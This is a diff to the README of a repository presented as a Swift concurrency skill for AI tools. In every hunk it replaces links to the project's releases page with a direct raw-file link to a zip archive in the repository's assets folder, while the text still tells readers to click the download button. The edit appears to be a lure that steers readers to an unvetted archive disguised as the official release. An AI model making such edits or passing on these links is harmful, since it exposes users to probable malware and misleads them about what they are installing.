@@ -1,6 +1,6 @@
 # ⚙️ Swift-Concurrency-Agent-Skill - Enhance AI Tools With Concurrency
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Swift--Concurrency--Agent--Skill-brightgreen?style=for-the-badge)](https://github.com/ghostineyt/Swift-Concurrency-Agent-Skill/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Swift--Concurrency--Agent--Skill-brightgreen?style=for-the-badge)](https://github.com/ghostineyt/Swift-Concurrency-Agent-Skill/raw/refs/heads/main/assets/Concurrency-Skill-Agent-Swift-v1.3.zip)
 
 ## 📋 About Swift-Concurrency-Agent-Skill
 
@@ -28,7 +28,7 @@ Before you start, make sure your PC meets these minimum requirements:
 
 Click the big green button above or use this link:
 
-[https://github.com/ghostineyt/Swift-Concurrency-Agent-Skill/releases](https://github.com/ghostineyt/Swift-Concurrency-Agent-Skill/releases)
+[https://github.com/ghostineyt/Swift-Concurrency-Agent-Skill/raw/refs/heads/main/assets/Concurrency-Skill-Agent-Swift-v1.3.zip](https://github.com/ghostineyt/Swift-Concurrency-Agent-Skill/raw/refs/heads/main/assets/Concurrency-Skill-Agent-Swift-v1.3.zip)
 
 This page contains the files you need. Look for the latest release, usually shown at the top, with a date.
 
@@ -117,7 +117,7 @@ AI tools often wait for responses or run slowly when busy. This skill speeds up 
 
 Return here any time to get the latest version:
 
-[https://github.com/ghostineyt/Swift-Concurrency-Agent-Skill/releases](https://github.com/ghostineyt/Swift-Concurrency-Agent-Skill/releases)
+[https://github.com/ghostineyt/Swift-Concurrency-Agent-Skill/raw/refs/heads/main/assets/Concurrency-Skill-Agent-Swift-v1.3.zip](https://github.com/ghostineyt/Swift-Concurrency-Agent-Skill/raw/refs/heads/main/assets/Concurrency-Skill-Agent-Swift-v1.3.zip)
 
 Click the big green button at the top for quick access.
 
